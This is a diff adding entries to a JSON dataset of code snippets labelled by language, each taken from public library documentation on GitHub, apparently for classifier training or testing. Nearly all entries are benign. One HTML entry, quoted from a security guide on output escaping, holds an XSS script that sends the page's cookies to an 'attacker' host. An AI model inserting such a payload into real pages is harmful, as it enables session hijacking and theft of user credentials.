@@ -385,5 +385,1505 @@
     "code": "one:\n  product: tshirt\n  wishlist: one\n\ntwo:\n  product: tshirt\n  wishlist: two",
     "tag": "yaml",
     "source": "https://github.com/rails/rails/blob/HEAD/guides/source/wishlists.md#L1222"
+  },
+  {
+    "label": "ts",
+    "code": "concat(...targets: Array<AxiosHeaders | RawAxiosHeaders | string | undefined | null>): AxiosHeaders;",
+    "tag": "ts",
+    "source": "https://github.com/axios/axios/blob/aa54a5e1e0e50cd1a2561b854ae5490ff589d065/docs/zh/pages/advanced/api-reference.md#L198"
+  },
+  {
+    "label": "ts",
+    "code": "// validations\nz.string().max(5);\nz.string().min(5);\nz.string().length(5);\nz.string().email();\nz.string().url();\nz.string().emoji();\nz.string().uuid();\nz.string().nanoid();\nz.string().cuid();\nz.string().cuid2();\nz.string().ulid();\nz.string().regex(regex);\nz.string().includes(string);\nz.string().startsWith(string);\nz.string().endsWith(string);\nz.string().datetime(); // ISO 8601; by default only `Z` timezone allowed\nz.string().ip(); // defaults to allow both IPv4 and IPv6\nz.string().cidr(); // defaults to allow both IPv4 and IPv6\n\n// transforms\nz.string().trim(); // trim whitespace\nz.string().toLowerCase(); // toLowerCase\nz.string().toUpperCase(); // toUpperCase\n\n// added in Zod 3.23\nz.string().date(); // ISO date format (YYYY-MM-DD)\nz.string().time(); // ISO time format (HH:mm:ss[.SSSSSS] or HH:mm)\nz.string().duration(); // ISO 8601 duration\nz.string().base64();",
+    "tag": "ts",
+    "source": "https://github.com/colinhacks/zod/blob/afdac65e0f80c0ccf9e8909da97c411567908b57/packages/docs-v3/home.md#L663"
+  },
+  {
+    "label": "ts",
+    "code": "// core schema\nimport {\n  mixed,\n  string,\n  number,\n  boolean,\n  bool,\n  date,\n  object,\n  array,\n  ref,\n  lazy,\n} from 'yup';\n\n// Classes\nimport {\n  Schema,\n  MixedSchema,\n  StringSchema,\n  NumberSchema,\n  BooleanSchema,\n  DateSchema,\n  ArraySchema,\n  ObjectSchema,\n} from 'yup';\n\n// Types\nimport type { InferType, ISchema, AnySchema, AnyObjectSchema } from 'yup';",
+    "tag": "ts",
+    "source": "https://github.com/jquense/yup/blob/ff31eee8a2b10c938bb3a22544d9e33957a8cf01/README.md#L486"
+  },
+  {
+    "label": "ts",
+    "code": "// Config instance.\nconfig?: InternalAxiosRequestConfig<D, P>;\n\n// Error code.\ncode?: string;\n\n// Request instance.\nrequest?: any;\n\n// Response instance.\nresponse?: AxiosResponse<T, D, {}, P>;\n\n// Boolean indicating if the error is an `AxiosError`.\nisAxiosError: boolean;\n\n// Error status code.\nstatus?: number;\n\n// Helper method to convert the error to a JSON object.\ntoJSON: () => object;\n\n// Error cause.\ncause?: Error;",
+    "tag": "ts",
+    "source": "https://github.com/axios/axios/blob/aa54a5e1e0e50cd1a2561b854ae5490ff589d065/docs/pages/advanced/api-reference.md#L86"
+  },
+  {
+    "label": "ts",
+    "code": "reset((formValues) => {\n  return {\n    ...formValues,\n    partialData: 'onlyChangeThis',\n  };\n});",
+    "tag": "tsx",
+    "source": "https://github.com/react-hook-form/react-hook-form/blob/ed9345ab9c199cb37afbb6ef73970cf697f4585d/CHANGELOG.md#L1004"
+  },
+  {
+    "label": "ts",
+    "code": "const take = <T>(arr: Array<T>, n: number): Array<T> => {\n  return arr.slice(0, n)\n}",
+    "tag": "typescript",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/typescript/add-generic-typing-to-an-anonymous-function.md#L21"
+  },
+  {
+    "label": "ts",
+    "code": "const createContact = (data: z.infer<typeof contactSchema>) => {\n  // ...\n}",
+    "tag": "typescript",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/typescript/generate-inferred-type-from-zod-schema.md#L27"
+  },
+  {
+    "label": "ts",
+    "code": "process.on('unhandledRejection', (reason: string, p: Promise<any>) => {\n  // I just caught an unhandled promise rejection,\n  // since we already have fallback handler for unhandled errors (see below),\n  // let throw and let him handle that\n  throw reason;\n});\n\nprocess.on('uncaughtException', (error: Error) => {\n  // I just received an error that was never handled, time to handle it and then decide whether a restart is needed\n  errorManagement.handler.handleError(error);\n  if (!errorManagement.handler.isTrustedError(error))\n    process.exit(1);\n});",
+    "tag": "typescript",
+    "source": "https://github.com/goldbergyoni/nodebestpractices/blob/dc3d60c29d5483d9ea99cf261bbd6203516a2ba7/sections/errorhandling/catchunhandledpromiserejection.md#L48"
+  },
+  {
+    "label": "ts",
+    "code": "import app from '../app';\nimport http from 'http';\n\n// Get port from environment and store in Express.\nconst port = normalizePort(process.env.PORT || '3000');\napp.set('port', port);\n\n// Create HTTP server.\nconst server = http.createServer(app);",
+    "tag": "typescript",
+    "source": "https://github.com/goldbergyoni/nodebestpractices/blob/dc3d60c29d5483d9ea99cf261bbd6203516a2ba7/sections/projectstructre/separateexpress.russian.md#L41"
+  },
+  {
+    "label": "ts",
+    "code": "describe('Facebook chat', () => {\n  it('Notifies on new chat message', () => {\n    const chatService = new chatService();\n    chatService.participants = getDisconnectedParticipants();\n    expect(chatService.sendMessage.bind({ message: 'Hi' })).to.throw(ConnectionError);\n  });\n});",
+    "tag": "typescript",
+    "source": "https://github.com/goldbergyoni/nodebestpractices/blob/dc3d60c29d5483d9ea99cf261bbd6203516a2ba7/sections/errorhandling/testingerrorflows.russian.md#L26"
+  },
+  {
+    "label": "ts",
+    "code": "// Should use `type`\ntype Bindings = {\n  TOKEN: string\n}\n\nconst app = new Hono<{ Bindings: Bindings }>()",
+    "tag": "ts",
+    "source": "https://github.com/honojs/hono/blob/5ca49b0720755c585c9a9835f0a479ceea36fb52/docs/MIGRATION.md#L116"
+  },
+  {
+    "label": "js",
+    "code": "import axios, { AxiosHeaders } from 'axios';\n\nconst headers = AxiosHeaders.concat(\n  { 'content-type': undefined },\n  { 'Content-Type': 'application/octet-stream' }\n);\n\nawait axios.put(url, data, { headers });",
+    "tag": "js",
+    "source": "https://github.com/axios/axios/blob/aa54a5e1e0e50cd1a2561b854ae5490ff589d065/docs/zh/pages/advanced/headers.md#L104"
+  },
+  {
+    "label": "js",
+    "code": "const RateLimit = require('express-rate-limit');\n// 如果请求需要经过代理，确保客户端IP能够传给req.ip这一点非常重要\napp.enable('trust proxy');\n\nconst apiLimiter = new RateLimit({\n  windowMs: 15*60*1000, // 15分钟\n  max: 100,\n});\n\n// 仅应用于以/user/开头的请求\napp.use('/user/', apiLimiter);",
+    "tag": "javascript",
+    "source": "https://github.com/goldbergyoni/nodebestpractices/blob/dc3d60c29d5483d9ea99cf261bbd6203516a2ba7/sections/security/limitrequests.chinese.md#L11"
+  },
+  {
+    "label": "js",
+    "code": "import Heading from './Heading.js';\nimport Section from './Section.js';\n\nexport default function Page() {\n  return (\n    <Section>\n      <Heading level={1}>Title</Heading>\n      <Section>\n        <Heading level={2}>Heading</Heading>\n        <Heading level={2}>Heading</Heading>\n        <Heading level={2}>Heading</Heading>\n        <Section>\n          <Heading level={3}>Sub-heading</Heading>\n          <Heading level={3}>Sub-heading</Heading>\n          <Heading level={3}>Sub-heading</Heading>\n          <Section>\n            <Heading level={4}>Sub-sub-heading</Heading>\n            <Heading level={4}>Sub-sub-heading</Heading>\n            <Heading level={4}>Sub-sub-heading</Heading>\n          </Section>\n        </Section>\n      </Section>\n    </Section>\n  );\n}",
+    "tag": "js",
+    "source": "https://github.com/reactjs/pt-br.react.dev/blob/ac8362350bbc25125a88b9309b54457589023c7e/src/content/learn/passing-data-deeply-with-context.md#L113"
+  },
+  {
+    "label": "js",
+    "code": "setToggle(true);\nconsole.log(toggle);\n//=> true",
+    "tag": "javascript",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/react/pass-a-function-to-a-usestate-updater.md#L12"
+  },
+  {
+    "label": "js",
+    "code": "import Toastify from 'toastify-js';\nimport 'toastify-js/src/toastify.css';\n\nexport function showNotification(message, theme) {\n  Toastify({\n    text: message,\n    duration: 2000,\n    gravity: 'top',\n    position: 'right',\n    style: {\n      background: theme === 'dark' ? 'black' : 'white',\n      color: theme === 'dark' ? 'white' : 'black',\n    },\n  }).showToast();\n}",
+    "tag": "js",
+    "source": "https://github.com/reactjs/pt-br.react.dev/blob/ac8362350bbc25125a88b9309b54457589023c7e/src/content/learn/escape-hatches.md#L428"
+  },
+  {
+    "label": "js",
+    "code": "async function berreskuratuErabiltzailea (id) {\n  await null\n  if (!id) throw Error('zati guztiak edukiz')\n  return {id}\n}\n\nconst erabiltzaileIdak = [1, 2, 0, 3]\n\n// 👍 orain azpiko lerroa pilaren aztarnan dago\nPromise.all(erabiltzaileIdak.map(async id => await berreskuratuErabiltzailea(id))).catch(console.log)",
+    "tag": "javascript",
+    "source": "https://github.com/goldbergyoni/nodebestpractices/blob/dc3d60c29d5483d9ea99cf261bbd6203516a2ba7/sections/errorhandling/returningpromises.basque.md#L182"
+  },
+  {
+    "label": "js",
+    "code": "<MySubComponent {...props} />",
+    "tag": "javascript",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/react/destructure-variables-as-props-to-a-component.md#L19"
+  },
+  {
+    "label": "js",
+    "code": "> Intl.DateTimeFormat('en-US', { dateStyle: \"full\" }).format(now)\n\"Tuesday, November 19, 2019\"\n> Intl.DateTimeFormat('en-US', { dateStyle: \"long\" }).format(now)\n\"November 19, 2019\"\n> Intl.DateTimeFormat('en-US', { dateStyle: \"medium\" }).format(now)\n\"Nov 19, 2019\"\n> Intl.DateTimeFormat('en-US', { dateStyle: \"short\" }).format(now)\n\"11/19/19\"",
+    "tag": "javascript",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/javascript/basic-date-formatting-without-a-library.md#L25"
+  },
+  {
+    "label": "js",
+    "code": "window.Echo = new Echo({\n    broadcaster: 'pusher',\n    // ...\n    namespace: 'App.Other.Namespace'\n});",
+    "tag": "js",
+    "source": "https://github.com/laravel/docs/blob/36fa00db57f97d0a5a89c40be7f50ff8b1133327/broadcasting.md#L1293"
+  },
+  {
+    "label": "js",
+    "code": "const myAlert = document.getElementById('myAlert')\nmyAlert.addEventListener('closed.bs.alert', event => {\n  // do something, for instance, explicitly move focus to the most appropriate element,\n  // so it doesn’t get lost/reset to the start of the page\n  // document.getElementById('...').focus()\n})",
+    "tag": "js",
+    "source": "https://github.com/twbs/bootstrap/blob/45f38383645985e613de7ac55466d8fba60b852c/site/src/content/docs/components/alert.mdx#L181"
+  },
+  {
+    "label": "js",
+    "code": "import rehypeStringify from 'rehype-stringify'\nimport remarkFrontmatter from 'remark-frontmatter'\nimport remarkGfm from 'remark-gfm'\nimport remarkParse from 'remark-parse'\nimport remarkRehype from 'remark-rehype'\nimport {unified} from 'unified'\n\nconst doc = `---\nlayout: solar-system\n---\n\n# Hi ~~Mars~~Venus!\n`\n\nconst file = await unified()\n  .use(remarkParse)\n  .use(remarkFrontmatter)\n  .use(remarkGfm)\n  .use(remarkRehype)\n  .use(rehypeStringify)\n  .process(doc)\n\nconsole.log(String(file))",
+    "tag": "js",
+    "source": "https://github.com/remarkjs/remark/blob/1146b3a274fc1f4607111e5d6607a3a769a0e89a/packages/remark-parse/readme.md#L155"
+  },
+  {
+    "label": "python",
+    "code": "mounts = {\n    \"all://example.com\": httpx.HTTPTransport(proxy=\"http://localhost:8030\"),\n}",
+    "tag": "python",
+    "source": "https://github.com/encode/httpx/blob/b5addb64f0161ff6bfe94c124ef76f6a1fba5254/docs/advanced/transports.md#L367"
+  },
+  {
+    "label": "python",
+    "code": "_PROCESS_COUNT = multiprocessing.cpu_count()",
+    "tag": "python",
+    "source": "https://github.com/grpc/grpc/blob/aa725a5afd3cea8ec29a86ec7611660943d01d2a/examples/python/multiprocessing/README.md#L26"
+  },
+  {
+    "label": "python",
+    "code": "UserInDB(\n    username = user_dict[\"username\"],\n    password = user_dict[\"password\"],\n    email = user_dict[\"email\"],\n    full_name = user_dict[\"full_name\"],\n    hashed_password = hashed_password,\n)",
+    "tag": "python",
+    "source": "https://github.com/fastapi/fastapi/blob/7a0a3f0b286c6c865cf4398ea0e957a87b8bffa4/docs/pt/docs/tutorial/extra-models.md#L125"
+  },
+  {
+    "label": "python",
+    "code": "from google.protobuf import descriptor_pool as _descriptor_pool\nfrom google.protobuf.internal import builder as _builder\n\n_desc = b'\\n\\x1aprotoc_explorer/main.proto\\x12\\x03pkg'\n\nDESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(_desc)\n_globals = globals()\n_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)\n_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'google3.protoc_explorer.main_pb2', _globals)",
+    "tag": "python",
+    "source": "https://github.com/protocolbuffers/protobuf/blob/5db636d202550a7c6efa49f5ea9742f87e32bab0/docs/upb/design.md#L416"
+  },
+  {
+    "label": "python",
+    "code": "def SayHello(self, request, context):\n    context.set_compression(grpc.Compression.NoCompression)\n    return helloworld_pb2.HelloReply(message='Hello, %s!' % request.name)",
+    "tag": "python",
+    "source": "https://github.com/grpc/grpc/blob/aa725a5afd3cea8ec29a86ec7611660943d01d2a/examples/python/compression/README.md#L51"
+  },
+  {
+    "label": "python",
+    "code": "headers = {\"X-Api-Key\": \"...\", \"X-Client-ID\": \"ABC123\"}\n\nwith httpx.Client(headers=headers) as client:\n    request = client.build_request(\"GET\", \"https://api.example.com\")\n\n    print(request.headers[\"X-Client-ID\"])  # \"ABC123\"\n\n    # Don't send the API key for this particular request.\n    del request.headers[\"X-Api-Key\"]\n\n    response = client.send(request)\n    ...",
+    "tag": "python",
+    "source": "https://github.com/encode/httpx/blob/b5addb64f0161ff6bfe94c124ef76f6a1fba5254/docs/advanced/clients.md#L164"
+  },
+  {
+    "label": "python",
+    "code": "from setuptools import setup\nsetup(\n    # ...\n    name='example_project',\n\n    # Require this package, but only for setup (not installation):\n    setup_requires=['protobuf_distutils'],\n\n    options={\n        # See below for details.\n        'generate_py_protobufs': {\n            'source_dir':        'path/to/protos',\n            'extra_proto_paths': ['path/to/other/project/protos'],\n            'output_dir':        'path/to/project/sources',  # default '.'\n            'proto_files':       ['relative/path/to/just_this_file.proto'],\n            'protoc':            'path/to/protoc.exe',\n        },\n    },\n)",
+    "tag": "python",
+    "source": "https://github.com/protocolbuffers/protobuf/blob/5db636d202550a7c6efa49f5ea9742f87e32bab0/python/protobuf_distutils/README.md#L23"
+  },
+  {
+    "label": "python",
+    "code": ">>> set(l1)\n{1, 2, 3, 4, 5}\n>>> frozenset(l1)\nfrozenset({1, 2, 3, 4, 5})",
+    "tag": "python",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/python/deduplicate-a-list-into-a-tuple.md#L15"
+  },
+  {
+    "label": "python",
+    "code": "import time\nfrom rich.progress import track\n\nfor i in track(range(20), description=\"For example:\"):\n    time.sleep(0.05)",
+    "tag": "python",
+    "source": "https://github.com/astral-sh/uv/blob/1cd8cf12bd622f2815406f29e3168d7f052bf1b3/docs/guides/scripts.md#L101"
+  },
+  {
+    "label": "python",
+    "code": "grpc_proto_library(\n  name = \"echo_proto\",\n  srcs = [\"echo.proto\"],\n  generate_mocks = True,\n)",
+    "tag": "py",
+    "source": "https://github.com/grpc/grpc/blob/aa725a5afd3cea8ec29a86ec7611660943d01d2a/doc/unit_testing.md#L69"
+  },
+  {
+    "label": "python",
+    "code": ">>> bool(0)\nFalse\n>>> bool(1)\nTrue",
+    "tag": "python",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/python/override-the-boolean-context-of-a-class.md#L7"
+  },
+  {
+    "label": "bash",
+    "code": "$ date +%s",
+    "tag": "bash",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/unix/get-the-unix-timestamp.md#L6"
+  },
+  {
+    "label": "bash",
+    "code": "php artisan optimize",
+    "tag": "shell",
+    "source": "https://github.com/laravel/docs/blob/36fa00db57f97d0a5a89c40be7f50ff8b1133327/deployment.md#L118"
+  },
+  {
+    "label": "bash",
+    "code": "sudo swupd bundle-add ruby-basic",
+    "tag": "sh",
+    "source": "https://github.com/jekyll/jekyll/blob/97c3bdc822df9d5bea4c269b29a28de5a5e29d70/docs/_docs/installation/other-linux.md#L55"
+  },
+  {
+    "label": "bash",
+    "code": "if [[ $(pwd) == *\"directory\"* ]]\nthen\n  echo \"You are in that directory\";\nfi",
+    "tag": "bash",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/unix/partial-string-matching-in-bash-scripts.md#L16"
+  },
+  {
+    "label": "bash",
+    "code": "$ uv venv",
+    "tag": "console",
+    "source": "https://github.com/astral-sh/uv/blob/1cd8cf12bd622f2815406f29e3168d7f052bf1b3/docs/guides/install-python.md#L106"
+  },
+  {
+    "label": "bash",
+    "code": "$ uvx --from git+https://github.com/httpie/cli@master httpie",
+    "tag": "console",
+    "source": "https://github.com/astral-sh/uv/blob/1cd8cf12bd622f2815406f29e3168d7f052bf1b3/docs/guides/tools.md#L129"
+  },
+  {
+    "label": "bash",
+    "code": "docker pull hadolint/hadolint\n# OR\ndocker pull ghcr.io/hadolint/hadolint",
+    "tag": "bash",
+    "source": "https://github.com/hadolint/hadolint/blob/1d901b9c0b0d0445d19b1a9128d89fa55bb4604e/README.md#L103"
+  },
+  {
+    "label": "bash",
+    "code": "python -m observability_greeter_server",
+    "tag": "sh",
+    "source": "https://github.com/grpc/grpc/blob/aa725a5afd3cea8ec29a86ec7611660943d01d2a/examples/python/observability/README.md#L30"
+  },
+  {
+    "label": "bash",
+    "code": "$ git checkout main\n$ git pull --rebase",
+    "tag": "bash",
+    "source": "https://github.com/rails/rails/blob/a0fd31e1a4e96c80d3184998c956607004fb7f8c/guides/source/contributing_to_ruby_on_rails.md#L955"
+  },
+  {
+    "label": "bash",
+    "code": "Success: <root path>\\working\\content\\consoleasync was uninstalled.",
+    "tag": "console",
+    "source": "https://github.com/dotnet/docs/blob/22dffe78e3542278c89cf2c2724be8f8272001dd/docs/core/tutorials/cli-templates-create-project-template.md#L172"
+  },
+  {
+    "label": "bash",
+    "code": "$ cd httpx\n$ scripts/install",
+    "tag": "shell",
+    "source": "https://github.com/encode/httpx/blob/b5addb64f0161ff6bfe94c124ef76f6a1fba5254/.github/CONTRIBUTING.md#L54"
+  },
+  {
+    "label": "json",
+    "code": "{\n    \"user\": {\n        \"id\": 1,\n        \"name\": \"Patrick Stewart\"\n        ...\n    }\n}",
+    "tag": "json",
+    "source": "https://github.com/laravel/docs/blob/36fa00db57f97d0a5a89c40be7f50ff8b1133327/broadcasting.md#L850"
+  },
+  {
+    "label": "json",
+    "code": "// package.json\n{\n  // ...\n  \"peerDependencies\": {\n    \"zod\": \"^3.25.0 || ^4.0.0\"\n  }\n}",
+    "tag": "json",
+    "source": "https://github.com/colinhacks/zod/blob/afdac65e0f80c0ccf9e8909da97c411567908b57/packages/docs/content/library-authors.mdx#L82"
+  },
+  {
+    "label": "json",
+    "code": "{\n    \"scripts-aliases\": {\n        \"phpstan\": [\"stan\", \"analyze\"]\n    }\n}",
+    "tag": "json",
+    "source": "https://github.com/composer/composer/blob/fac7d53f689dee6254f110f3b0104dfa39e607a9/doc/04-schema.md#L1040"
+  },
+  {
+    "label": "json",
+    "code": "{ \n  \"files\" : [\n    \"dist/moment.js\",\n    \"dist/moment.min.js\"\n  ]\n}",
+    "tag": "json",
+    "source": "https://github.com/goldbergyoni/nodebestpractices/blob/dc3d60c29d5483d9ea99cf261bbd6203516a2ba7/sections/security/avoid_publishing_secrets.brazilian-portuguese.md#L29"
+  },
+  {
+    "label": "json",
+    "code": "{\n  \"dependencies\": {\n    \"react\": \"latest\",\n    \"react-dom\": \"latest\",\n    \"react-scripts\": \"latest\",\n    \"toastify-js\": \"1.12.0\"\n  },\n  \"scripts\": {\n    \"start\": \"react-scripts start\",\n    \"build\": \"react-scripts build\",\n    \"test\": \"react-scripts test --env=jsdom\",\n    \"eject\": \"react-scripts eject\"\n  }\n}",
+    "tag": "json",
+    "source": "https://github.com/reactjs/pt-br.react.dev/blob/ac8362350bbc25125a88b9309b54457589023c7e/src/content/learn/escape-hatches.md#L328"
+  },
+  {
+    "label": "json",
+    "code": "{\n    \"name\": \"my/repository\",\n    \"homepage\": \"http://packages.example.org\",\n    \"repositories\": [\n        { \"type\": \"vcs\", \"url\": \"https://github.com/mycompany/privaterepo\" },\n        { \"type\": \"vcs\", \"url\": \"http://svn.example.org/private/repo\" },\n        { \"type\": \"vcs\", \"url\": \"https://github.com/mycompany/privaterepo2\" }\n    ],\n    \"require-all\": true\n}",
+    "tag": "json",
+    "source": "https://github.com/composer/composer/blob/fac7d53f689dee6254f110f3b0104dfa39e607a9/doc/articles/handling-private-packages.md#L47"
+  },
+  {
+    "label": "json",
+    "code": "{\n    \"repositories\": [\n        {\n            \"type\": \"package\",\n            \"package\": {\n                \"name\": \"smarty/smarty\",\n                \"version\": \"3.1.7\",\n                \"dist\": {\n                    \"url\": \"https://www.smarty.net/files/Smarty-3.1.7.zip\",\n                    \"type\": \"zip\"\n                },\n                \"source\": {\n                    \"url\": \"http://smarty-php.googlecode.com/svn/\",\n                    \"type\": \"svn\",\n                    \"reference\": \"tags/Smarty_3_1_7/distribution/\"\n                },\n                \"autoload\": {\n                    \"classmap\": [\"libs/\"]\n                }\n            }\n        }\n    ],\n    \"require\": {\n        \"smarty/smarty\": \"3.1.*\"\n    }\n}",
+    "tag": "json",
+    "source": "https://github.com/composer/composer/blob/fac7d53f689dee6254f110f3b0104dfa39e607a9/doc/05-repositories.md#L866"
+  },
+  {
+    "label": "json",
+    "code": "--8<-- \"examples/meta.output\"",
+    "tag": "json",
+    "source": "https://github.com/nlohmann/json/blob/ffcd392be06c871e9a75f7d6b4f4b9c2288bc19c/docs/mkdocs/docs/integration/package_managers.md#L30"
+  },
+  {
+    "label": "json",
+    "code": "{\n  \"model_name\": \"alexnet\",\n  \"message\": \"Deep Learning FTW!\"\n}",
+    "tag": "json",
+    "source": "https://github.com/fastapi/fastapi/blob/7a0a3f0b286c6c865cf4398ea0e957a87b8bffa4/docs/pt/docs/tutorial/path-params.md#L195"
+  },
+  {
+    "label": "json",
+    "code": "{\n    \"detail\": [\n        {\n            \"type\": \"extra_forbidden\",\n            \"loc\": [\"query\", \"tool\"],\n            \"msg\": \"Extra inputs are not permitted\",\n            \"input\": \"plumbus\"\n        }\n    ]\n}",
+    "tag": "json",
+    "source": "https://github.com/fastapi/fastapi/blob/7a0a3f0b286c6c865cf4398ea0e957a87b8bffa4/docs/pt/docs/tutorial/query-param-models.md#L47"
+  },
+  {
+    "label": "json",
+    "code": "[\n  {\n    \"AllowedHeaders\": [\n      \"Content-Type\",\n      \"Content-MD5\",\n      \"Content-Disposition\"\n    ],\n    \"AllowedMethods\": [\n      \"PUT\"\n    ],\n    \"AllowedOrigins\": [\n      \"https://www.example.com\"\n    ],\n    \"MaxAgeSeconds\": 3600\n  }\n]",
+    "tag": "json",
+    "source": "https://github.com/rails/rails/blob/a0fd31e1a4e96c80d3184998c956607004fb7f8c/guides/source/active_storage_overview.md#L1590"
+  },
+  {
+    "label": "html",
+    "code": "<head>\n  <link\n    rel=\"stylesheet\"\n    href=\"https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.0.0/animate.compat.css\"\n  />\n</head>",
+    "tag": "html",
+    "source": "https://github.com/animate-css/animate.css/blob/3f8ab233dbbd9d2fe577528d2296382954be3d1a/docsSource/sections/06-migration.md#L38"
+  },
+  {
+    "label": "html",
+    "code": "<h1>Hello, Neptune!</h1>",
+    "tag": "html",
+    "source": "https://github.com/remarkjs/remark/blob/1146b3a274fc1f4607111e5d6607a3a769a0e89a/readme.md#L253"
+  },
+  {
+    "label": "html",
+    "code": "<p>page rendered at: Tue June 22 23:38:47 –0500 2010</p>",
+    "tag": "html",
+    "source": "https://github.com/jekyll/jekyll/blob/97c3bdc822df9d5bea4c269b29a28de5a5e29d70/docs/_docs/plugins/tags.md#L70"
+  },
+  {
+    "label": "html",
+    "code": "{{ define \"users/index.tmpl\" }}\n<html>\n  <h1>{{ .title }}</h1>\n  <p>Using users/index.tmpl</p>\n</html>\n{{ end }}",
+    "tag": "html",
+    "source": "https://github.com/gin-gonic/gin/blob/0f09c3a9b4626d9fe9979cf4d0521d6ae32ab646/docs/doc.md#L1988"
+  },
+  {
+    "label": "html",
+    "code": "<div class=foo>\n  <div class=\"green-theme\">\n    <p class=bar>\n  </div>\n</div>",
+    "tag": "html",
+    "source": "https://github.com/sass/sass-site/blob/5701c5d1b2290358487b4f51b6ca20ee04fb8784/source/blog/036-sass-and-native-nesting.md#L71"
+  },
+  {
+    "label": "html",
+    "code": "<div class=\"toast\" role=\"alert\" aria-live=\"polite\" aria-atomic=\"true\" data-bs-delay=\"10000\">\n  <div role=\"alert\" aria-live=\"assertive\" aria-atomic=\"true\">...</div>\n</div>",
+    "tag": "html",
+    "source": "https://github.com/twbs/bootstrap/blob/45f38383645985e613de7ac55466d8fba60b852c/site/src/content/docs/components/toasts.mdx#L342"
+  },
+  {
+    "label": "html",
+    "code": "<link rel=\"stylesheet\" href=\"/assets/_reset-76a913c3.css\">\n<link rel=\"stylesheet\" href=\"/assets/application-71d3eebf.css\">\n<link rel=\"stylesheet\" href=\"/assets/fonts-mhnk3214.css\">",
+    "tag": "html",
+    "source": "https://github.com/rails/rails/blob/a0fd31e1a4e96c80d3184998c956607004fb7f8c/guides/source/asset_pipeline.md#L187"
+  },
+  {
+    "label": "html",
+    "code": "<form id=\"form\">\n  <label>\n    Nome:\n    <b id=\"firstNameText\">Jane</b>\n    <input\n      id=\"firstNameInput\"\n      value=\"Jane\"\n      style=\"display: none\">\n  </label>\n  <label>\n    Sobrenome:\n    <b id=\"lastNameText\">Jacobs</b>\n    <input\n      id=\"lastNameInput\"\n      value=\"Jacobs\"\n      style=\"display: none\">\n  </label>\n  <button type=\"submit\" id=\"editButton\">Editar Perfil</button>\n  <p><i id=\"helloText\">Olá, Jane Jacobs!</i></p>\n</form>\n\n<style>\n* { box-sizing: border-box; }\nbody { font-family: sans-serif; margin: 20px; padding: 0; }\nlabel { display: block; margin-bottom: 20px; }\n</style>",
+    "tag": "html",
+    "source": "https://github.com/reactjs/pt-br.react.dev/blob/ac8362350bbc25125a88b9309b54457589023c7e/src/content/learn/reacting-to-input-with-state.md#L1082"
+  },
+  {
+    "label": "html",
+    "code": "<div>\n  <b>A pseudo comment to the a post</b>\n  <script>\n    window.location='http://attacker/?cookie='+document.cookie\n</script>\n</div>",
+    "tag": "html",
+    "source": "https://github.com/goldbergyoni/nodebestpractices/blob/dc3d60c29d5483d9ea99cf261bbd6203516a2ba7/sections/security/escape-output.japanese.md#L24"
+  },
+  {
+    "label": "html",
+    "code": "<form action=\"/search\" accept-charset=\"UTF-8\" method=\"post\">\n  <input type=\"hidden\" name=\"_method\" value=\"patch\" autocomplete=\"off\">\n  <input type=\"hidden\" name=\"authenticity_token\" value=\"R4quRuXQAq75TyWpSf8AwRyLt-R1uMtPP1dHTTWJE5zbukiaY8poSTXxq3Z7uAjXfPHiKQDsWE1i2_-h0HSktQ\" autocomplete=\"off\">\n<!-- ... -->\n</form>",
+    "tag": "html",
+    "source": "https://github.com/rails/rails/blob/a0fd31e1a4e96c80d3184998c956607004fb7f8c/guides/source/form_helpers.md#L429"
+  },
+  {
+    "label": "html",
+    "code": "<form x-data=\"{\n    form: $form('post', '/register', {\n        name: '{{ old('name') }}',\n        email: '{{ old('email') }}',\n    }).setErrors({{ Js::from($errors->messages()) }}),\n}\">",
+    "tag": "html",
+    "source": "https://github.com/laravel/docs/blob/36fa00db57f97d0a5a89c40be7f50ff8b1133327/precognition.md#L498"
+  },
+  {
+    "label": "html",
+    "code": "<div class=\"group\">\n  <div class=\"flex items-center gap-3\">\n    <input\n      type=\"checkbox\"\n      id=\"group-enable\"\n      class=\"w-5 h-5 cursor-pointer\"\n    />\n    <label\n      for=\"group-enable\"\n      class=\"cursor-pointer text-slate-700 font-medium\"\n    >\n      I agree to the terms and conditions\n    </label>\n  </div>\n  <button\n    class=\"opacity-40 pointer-events-none grayscale cursor-not-allowed group-has-[:checked]:opacity-100 group-has-[:checked]:pointer-events-auto group-has-[:checked]:grayscale-0 group-has-[:checked]:cursor-pointer\"\n  >\n    Group Submit\n  </button>\n</div>",
+    "tag": "html",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/tailwind/disable-and-enable-a-button.md#L46"
+  },
+  {
+    "label": "css",
+    "code": "input, button { display: block; margin-bottom: 20px; }\nvideo { width: 250px; }",
+    "tag": "css",
+    "source": "https://github.com/reactjs/pt-br.react.dev/blob/ac8362350bbc25125a88b9309b54457589023c7e/src/content/learn/synchronizing-with-effects.md#L277"
+  },
+  {
+    "label": "css",
+    "code": "div.circle {\n  border-radius: 50000px;\n}",
+    "tag": "css",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/css/circular-icons-with-a-massive-border-radius.md#L7"
+  },
+  {
+    "label": "css",
+    "code": "@tailwind base;\n@tailwind components;\n@tailwind utilities;\n\n/* additional styling here 👇 */\n.code-block {\n  @apply bg-gray-200 rounded-md p-4;\n}",
+    "tag": "css",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/tailwind/apply-tailwind-classes-to-existing-css-class.md#L24"
+  },
+  {
+    "label": "css",
